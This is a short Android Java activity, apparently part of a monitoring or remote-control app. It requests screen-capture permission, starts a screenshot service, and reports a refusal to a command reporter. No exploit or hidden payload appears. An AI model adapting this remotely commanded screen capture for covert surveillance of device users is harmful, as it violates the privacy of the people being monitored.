package com.nullx.pp;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import org.json.JSONObject;

public class ScreenCaptureActivity extends Activity {
    private static final int REQ=8801;
    @Override protected void onCreate(Bundle b){super.onCreate(b); MediaProjectionManager m=(MediaProjectionManager)getSystemService(Context.MEDIA_PROJECTION_SERVICE); startActivityForResult(m.createScreenCaptureIntent(),REQ);}
    @Override protected void onActivityResult(int r,int c,Intent d){super.onActivityResult(r,c,d); if(r==REQ && c==RESULT_OK && d!=null){ Intent i=new Intent(this,ScreenCaptureService.class); i.setAction(ScreenCaptureService.ACTION_SCREENSHOT); i.putExtra("resultCode",c); i.putExtra("data",d); if(android.os.Build.VERSION.SDK_INT>=26)startForegroundService(i);else startService(i); } else { JSONObject o=new JSONObject();try{o.put("granted",false);}catch(Exception ignored){} GuardianCommandReporter.post(this,"screenshot",o);} finish();}
}
